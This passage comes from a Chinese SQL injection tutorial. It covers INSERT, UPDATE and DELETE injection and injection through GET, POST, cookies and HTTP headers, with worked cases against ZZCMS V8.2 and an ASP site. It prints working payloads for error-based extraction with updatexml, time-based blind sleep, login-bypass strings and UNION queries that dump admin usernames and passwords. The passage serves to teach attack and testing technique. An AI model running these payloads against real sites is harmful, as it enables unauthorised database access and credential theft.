<p>&emsp;&emsp;可控点是VALUES中的值，这里我们所说的闭合就是将引号和括号都闭合，使其成为完整的SQL语句，然后将程序本身的语句后段注释掉。</p>
<p>&emsp;&emsp;<strong>注入payload的结构：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a',user(),'c');<span class="comment">-- '</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<strong>说明：</strong>–后面有个空格，否则可能被识别为减号</p>
<p>&emsp;&emsp;把payload带入语句中形成的最终语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(col1,col2,col3) <span class="keyword">VALUES</span>(<span class="string">'a'</span>,<span class="keyword">user</span>(),<span class="string">'c'</span>);<span class="comment">-- '','b','c');</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<strong>注入过程：</strong></p>
<ul>
<li>判断列数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1',2,3,4,5,6,7);<span class="comment">-- '</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<strong>说明：</strong>最好用数字填充values的值，因为数字可以插入字符型的列，而字符串无法插入数字型的列</p>
<p>&emsp;&emsp;当输入的值的个数和列的个数不匹配的时候，则会插入失败：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524284039.1835485.png" alt=""></p>
<p>&emsp;&emsp;当输入的值的个数和列的个数匹配的时候，则会插入成功。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524284175.7039232.png" alt=""></p>
<p>&emsp;&emsp;从而来判断列的个数。</p>
<ul>
<li>注入数据库用户</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a',user(),3,4,5,6,7);<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524284549.454817.png" alt=""></p>
<p>&emsp;&emsp;然后查看数据：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524284581.6854281.png" alt=""></p>
<ul>
<li>注入表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1',2,3,4,5,6,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()));<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524284700.0042932.png" alt=""></p>
<p>&emsp;&emsp;然后查看数据:</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524285576.36195.png" alt=""></p>
<ul>
<li>注入列</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1',2,3,4,5,6,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span>));<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524285610.1601908.png" alt=""></p>
<p>&emsp;&emsp;然后查看数据:</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524285633.0072465.png" alt=""></p>
<ul>
<li>注入数据：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1',2,3,4,5,6,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>));<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524285721.396188.png" alt=""></p>
<p>&emsp;&emsp;然后查看数据:</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524285754.3340464.png" alt=""></p>
<ul>
<li>常见问题：</li>
</ul>
<p>&emsp;&emsp;第一个：注入数据只能在string型(e.g. name)的列位置，因为int型(e.g. age)的列无法存放字符串。</p>
<p>&emsp;&emsp;第二个：列有长度限制，如果注入出的数据过长，则会显示不全，可以逐段注入数据(limit 0,1 或者 mid(password,1,n))。</p>
<h4 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h4><h5 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h5><p>&emsp;&emsp;和INSERT注入检测方法相同，请参考上面的检测方法。</p>
<h5 id="报错法-1"><a href="#报错法-1" class="headerlink" title="报错法"></a>报错法</h5><p>&emsp;&emsp;UPDATE配合报错注入的语句结构：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7c,注入语句),2) or'</span><br></pre></td></tr></table></figure>
<ul>
<li>爆数据库用户名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7c,user()),2) or'</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524286521.5428739.png" alt=""></p>
<ul>
<li>爆表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>())),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524286945.994896.png" alt=""></p>
<ul>
<li>爆列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'admin'</span>)),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524287055.3898635.png" alt=""></p>
<ul>
<li>爆数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or updatexml(0,concat(0x7c,(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="number">0x7c</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">admin</span>)),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524287196.9346588.png" alt=""></p>
<h5 id="闭合语句法-1"><a href="#闭合语句法-1" class="headerlink" title="闭合语句法"></a>闭合语句法</h5><p>&emsp;&emsp;UPDATE语句闭合难度要比INSERT语句难一点，下面我们先看下UPDATE语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> col1=<span class="string">'aaa'</span>[,col2=<span class="string">'aaa'</span>] <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们要用到它的特性构造：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方法1：</span></span><br><span class="line">payload:aaa' where id=1 and (盲注语句)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> col1=<span class="string">'aaa'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (盲注语句)<span class="comment">--' where id = 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方法2：</span></span><br><span class="line">payload:aaa<span class="string">',col2=user() where id=1--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">UPDATE table_name SET col1='</span>aaa<span class="string">',col2=user() where id=1-- '</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;比较鸡肋的是：我们需要知道它的列名。</p>
<p>&emsp;&emsp;这里侧重介绍一下第二种方法：</p>
<ul>
<li>查数据库用户名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a',class=user() where id=1017<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524287985.642943.png" alt=""></p>
<p>&emsp;&emsp;查看信息</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288044.6064885.png" alt=""></p>
<ul>
<li>查表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a',class=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()) <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1017</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288139.8169675.png" alt=""></p>
<p>&emsp;&emsp;查看信息</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288227.2045686.png" alt=""></p>
<ul>
<li>查列名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a',class=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span>) <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1017</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288255.71658.png" alt=""></p>
<p>&emsp;&emsp;查看信息</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288283.0187237.png" alt=""></p>
<ul>
<li>查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a',class=(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1017</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288343.5725708.png" alt=""></p>
<p>&emsp;&emsp;查看信息</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288370.5079904.png" alt=""></p>
<h4 id="DELETE注入"><a href="#DELETE注入" class="headerlink" title="DELETE注入"></a>DELETE注入</h4><p>&emsp;&emsp;DELETE语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;DELETE语句给用户控制的点只有id=1这里了，所以注入方法比较简单，只能使用基于时间的盲注或者报错注入来进行了。</p>
<ul>
<li>判断注入</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1=1,sleep(5),0)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524288674.067858.png" alt=""></p>
<ul>
<li>注入过程</li>
</ul>
<p>&emsp;&emsp;注入过程只能采用报错注入或者基于时间的盲注，因为当where条件控制语句的集合为空的时候，也显示删除成功(语句执行成功了的)。</p>
<p>&emsp;&emsp;配合报错注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(0,concat(0x7c,注入语句),1)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524834902.6059659.png" alt=""></p>
<p>&emsp;&emsp;配合基于时间的盲注：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(盲注语句,sleep(5),0)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524835033.344471.png" alt=""></p>
<h3 id="根据提交方式分类"><a href="#根据提交方式分类" class="headerlink" title="根据提交方式分类"></a>根据提交方式分类</h3><p>&emsp;&emsp;根据数据的提交方式进行分类，数据的提交方式包括GET、POST、COOKIE、HTTP头，所以此分类就有4类，GET注入、POST注入、COOKIE注入、HTTP注入</p>
<p>&emsp;&emsp;其中，除GET注入以外，其他三种注入方法常常和盲注、报错注入配合使用。在本章节我们不会详细介绍盲注和报错注入的使用方法和选择方法，案例中我们也只提供一个Payload的框架，具体使用方法请到前面的相关章节学习。</p>
<h4 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h4><p>&emsp;&emsp;使用GET型提交方法提交数据的注入点也被称为GET型注入。我们之前提到的SQL注入大多都是GET型注入，它的特点就是将注入语句放入URL中进行注入的。</p>
<h4 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h4><p>&emsp;&emsp;顾名思义，使用POST型提交方法提交数据的注入点也被称为POST型注入，常见的POST型注入产生的地方有：登陆、注册等等。之前我们提到的INSERT注入就是以POST的提交方式提交数据的，因此它也属于一个POST型注入。</p>
<p>&emsp;&emsp;POST型注入方法和GET型类似，如果有回显的话可以用联合查询法；如果无回显的话可以用盲注和报错注入；如果后台执行的SQL语句不是select，则按照对应的SQL语句注入方法进行注入即可。</p>
<p>&emsp;&emsp;这里我们还是用之前MySQL注入演示的那套源码的后台登陆做演示</p>
<p>&emsp;&emsp;第一步：抓取登陆包</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524408381.935496.png" alt=""></p>
<p>&emsp;&emsp;第二步：在Repeater中将注入payload放入用户名参数中(不放入密码参数是因为密码参数在带入数据库查询之前会做一个md5加密)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">admin' and if(1=1,sleep(5),0) and 'a'='a</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 一般后台登陆的SQL语句为：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  select * from admin where username='$username' and password='$password';</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  因为账号密码均是字符类型，因此需要单引号包裹</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  因此我们再构造payload的时候需要闭合单引号</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  admin' 闭合前面的单引号</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  and 'a'='a 闭合后面的单引号 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  payload带入后则是：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  select * from admin where username='admin' and if(1=1,sleep(5),0) and 'a'='a' and password='password';</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524410818.1582441.png" alt=""></p>
<p>&emsp;&emsp;如果if判断条件成立的话则延时5秒返回结果，否则直接返回。</p>
<p>&emsp;&emsp;说明：</p>
<ul>
<li><p>1.后面的注入可以参考基于时间的盲注进行下一步的注入</p>
</li>
<li><p>2.这里我们只列举了这一种情况，当然有些情况下报错注入也是可以用的，只不过需要打印mysql_error()</p>
</li>
<li><p>3.除了用Burpsuite抓包放入Repeater中测试之外，还可以用hackbar的POST提交方法进行测试</p>
</li>
<li><p>4.万能密码：使语句称为永真式即可(e.g. admin’ # , admin’ or ‘1’=’1)</p>
</li>
</ul>
<h4 id="COOKIE注入"><a href="#COOKIE注入" class="headerlink" title="COOKIE注入"></a>COOKIE注入</h4><p><strong>COOKIE注入介绍</strong></p>
<p>&emsp;&emsp;COOKIE型注入是通过COOKIE进行数据提交的，其常见的情况有验证登陆、$_REQUEST获取参数。</p>
<p>&emsp;&emsp;验证登陆是将用户的登陆信息放入COOKIE中来做权限验证的一种方法，下面我们将提到的案例1就是验证登陆缺陷产生的注入。</p>
<p>&emsp;&emsp;$_REQUEST是一种获取数据的方法，它包含了GET、POST、COOKIE三种提交方式。如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_REQUEST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;对于这段代码，我们使用GET、POST、COOKIE三种提交方式进行数据提交均可。</p>
<p><strong>COOKIE注入案例</strong></p>
<p>&emsp;&emsp;简单的介绍了COOKIE注入以后，我们来看下两个案例。</p>
<ul>
<li>案例1：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">环境：php5+MySQL5.5+apache (win)</span><br><span class="line">CMS: ZZCMS V8.2</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们先看下/dl/dl_download.php的代码片段。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();   <span class="comment">//打开缓存区 </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../inc/conn.php"</span>);</span><br><span class="line">$founderr=<span class="number">0</span>;</span><br><span class="line">$ErrMsg=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]))&#123;</span><br><span class="line">showmsg(<span class="string">'请先登录'</span>,<span class="string">'/user/login.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_COOKIE[<span class="string">"UserName"</span>];</span><br><span class="line"><span class="comment">//echo $username;</span></span><br><span class="line">$id=<span class="string">""</span>;</span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($_POST[<span class="string">'id'</span>]);$i++)&#123;</span><br><span class="line">    $id=$id.($_POST[<span class="string">'id'</span>][$i].<span class="string">','</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$founderr=<span class="number">1</span>;</span><br><span class="line">	$ErrMsg=<span class="string">"&lt;li&gt;操作失败！请先选中要下载的信息&lt;/li&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$id=substr($id,<span class="number">0</span>,strlen($id)<span class="number">-1</span>);<span class="comment">//去除最后面的","</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'FileExt'</span>]))&#123;</span><br><span class="line">$FileExt=$_POST[<span class="string">'FileExt'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$FileExt=<span class="string">"xls"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (check_user_power(<span class="string">"dls_download"</span>)==<span class="string">"no"</span>)&#123;</span><br><span class="line">$founderr=<span class="number">1</span>;</span><br><span class="line">$ErrMsg=$ErrMsg.<span class="string">"&lt;li&gt;您所在的用户组没有下载"</span>.channeldl.<span class="string">"信息的权限！&lt;br&gt;&lt;input  type=button value=升级成VIP会员 onclick=\"location.href='/one/vipuser.php'\"/&gt;&lt;/li&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断查看代理条数</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select looked_dls_number_oneday from zzcms_usergroup where groupid=(select groupid from zzcms_user where username='"</span>.$username.<span class="string">"')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $sql;</span></span><br><span class="line">$rslookedlsnumber=query($sql);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其中使用$_COOKIE[“UserName”]从cookie中获取操作者的用户名，未经过滤直接带入数据库进行查询，因此导致了COOKIE注入。</p>
<p>&emsp;&emsp;访问dl/dl_download.php，然后用burpsite抓包：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524387961.7706919.png" alt=""></p>
<p>&emsp;&emsp;COOKIE中无UserName时，则会输出一个”请登陆”的重定向跳转到登陆界面。</p>
<p>&emsp;&emsp;构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;UserName=admin&apos;) or if(1=1,sleep(5),0)  %23&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524388122.6568189.png" alt=""></p>
<p>&emsp;&emsp;if条件成立，延时了5s,程序执行超时，因此无回显。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524388191.4307272.png" alt=""></p>
<p>&emsp;&emsp;if条件不成立，没有超时，因此产生回显。</p>
<p>&emsp;&emsp;接下来的注入过程和时间盲注是一样的，请参考前面的时间盲注过程。</p>
<ul>
<li>案例2：</li>
</ul>
<p>&emsp;&emsp;在ASP站点中，用request代替get的情况非常多，比如我们前面用来做ACCESS注入演示的站点就是用request接受的参数，而request包含了get、post、cookie三种方式。</p>
<p>&emsp;&emsp;这种情况下判断是否存在COOKIE注入的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.程序可以接受cookie传递来的参数，如：</span><br><span class="line">    将.asp后的id=1442放入Cookie中观察页面的回显</span><br><span class="line"></span><br><span class="line">2.是否对参数进行了过滤: and 1=1 and 1=2回显不同</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524416124.8826845.png" alt=""></p>
<p>&emsp;&emsp;下面我们进行COOKIE注入的演示：</p>
<p>&emsp;&emsp;第一步，访问目标站点，然后抓包。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524417095.0185142.png" alt=""></p>
<p>&emsp;&emsp;第二步，将参数id放入cookie中</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524417159.9591393.png" alt=""></p>
<p>&emsp;&emsp;我们发现把.asp后面的?id=1442去掉，然后在Cookie中加上id=1442之后，服务器仍知道我们想请求的界面是id=1442的界面，这说明服务器可以接受Cookie传递来的参数。</p>
<p>&emsp;&emsp;第三步：按照我们的注入过程来进行。</p>
<ul>
<li>猜表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1442+union+<span class="keyword">select</span>+top+<span class="number">1</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>+<span class="keyword">from</span>+<span class="keyword">admin</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这里用+代替空格的原因：从cookie中接受到的数据会自动过滤空格，因此用+代替。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524417442.1436443.png" alt=""></p>
<ul>
<li>猜列名并查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1442+union+<span class="keyword">select</span>+top+<span class="number">1</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="keyword">admin</span>,<span class="number">14</span>,<span class="keyword">password</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>+<span class="keyword">from</span>+<span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524417541.10651.png" alt=""></p>
<h4 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h4><p>&emsp;&emsp;HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。</p>
<p>&emsp;&emsp;HTTP头注入常发生在程序采集用户信息的模块中，比如获取用户的IP：X-Forwarded-For；再比如获取用户的浏览器类型：User-Agent 等等…</p>
<p>&emsp;&emsp;从HTTP头中的获取的数据一般不会改变页面的回显，因此，基于时间的盲注常和HTTP头注入配合使用。</p>
<p>&emsp;&emsp;接下来我们看一个案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">环境：win32+apache+php5+MySQL5.6</span><br><span class="line">CMS: ZZCMS V8.2</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在后台登陆处抓包，然后在数据包中加上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123&apos; or 1=1 #</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524419126.5550346.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123&apos; or 2=1 #</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1524419171.826771.png" alt=""></p>
<p>&emsp;&emsp;从以上测试中，我们得到了页面差，or true 则回显15分钟以后再试，而 or false则是显示还可以再试49次，接下来我们就可以用框架：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123&apos; or 盲注语句 #</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;继续进行注入的测试。盲注方法请参看盲注章节。</p>
<h3 id="根据闭合方式分类"><a href="#根据闭合方式分类" class="headerlink" title="根据闭合方式分类"></a>根据闭合方式分类</h3><p>&emsp;&emsp;不同数据类型的数据在SQL语句拼接的时候也会有所不同，比如数字型的不需要单引号包裹，但是字符型的就需要单引号包裹，而搜索型的则是在用户提交的数据前后加上通配符%，因此由此分类，其实是按照闭合方式来进行的分类。</p>
